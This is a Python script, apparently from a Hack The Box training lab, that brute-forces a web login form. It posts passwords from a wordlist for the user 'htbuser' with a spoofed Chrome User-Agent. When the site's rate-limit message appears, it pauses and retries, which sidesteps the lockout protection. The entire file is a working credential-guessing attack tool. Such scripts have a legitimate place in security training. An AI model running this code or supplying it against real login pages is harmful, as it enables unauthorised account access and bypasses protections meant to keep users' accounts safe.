import sys
import time
import requests
import os.path

# define target TARGET_URL, change as needed
TARGET_URL = "http://94.237.48.48:45256/"

# define a fake HEADERS to present ourself as Chromium browser, change if needed
HEADERS = {
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"
  }

# Investigate source code for success, failure and timeout strings
SUCCESS_STRING = None
FAILURE_STRING = "Invalid credentials"
TIMEOUT_STRING = "Too many login failures, please wait"

# Investigate source code for the timeout period for login attempts (seconds)
REQUEST_PAUSE  = 45

"""
wordlist is expected as simple list, we keep this function to have it ready if needed.
for this test we are using /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
change this function if your wordlist has a different format
"""
def unpack(fline):
  userid = 'htbuser'
  passwd = fline

  return userid, passwd

"""
POST request, change request fields as needed in the data variable
"""
def do_req(TARGET_URL, userid, passwd, HEADERS):
  data = {"userid": userid, "passwd": passwd, "submit": "submit"}
  res = requests.post(url=TARGET_URL, headers=HEADERS, data=data)
  print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))

  return res.text

def main():
  # check if this script has been runned with an argument, and the argument exists and is a file
  if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
    fname = sys.argv[1]
  else:
    print("[!] Please check wordlist.")
    print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
    sys.exit()

  # open the file, this is our wordlist
  with open(fname) as fh:
    # read file line by line
    for fline in fh:
      # skip line if it starts with a comment
      if fline.startswith("#"):
          continue
      # use unpack() function to extract userid and password from wordlist, removing trailing newline
      userid, passwd = unpack(fline.rstrip())

      # call do_req() to do the HTTP request
      res = do_req(TARGET_URL, userid, passwd, HEADERS)
      
      # If the timeout string has been detected 
      if res.find(TIMEOUT_STRING) != -1:
        print(f"[!] Hit maximum number of requests!")
        print(f"[-] Restarting in {REQUEST_PAUSE} seconds")
        time.sleep(REQUEST_PAUSE)
        res = do_req(TARGET_URL, userid, passwd, HEADERS)
      
      # Process the response
      print("[-] Checking account {} {}".format(userid, passwd))
    
      if res.find(FAILURE_STRING) == -1:
        print(res)


if __name__ == "__main__":
  main()
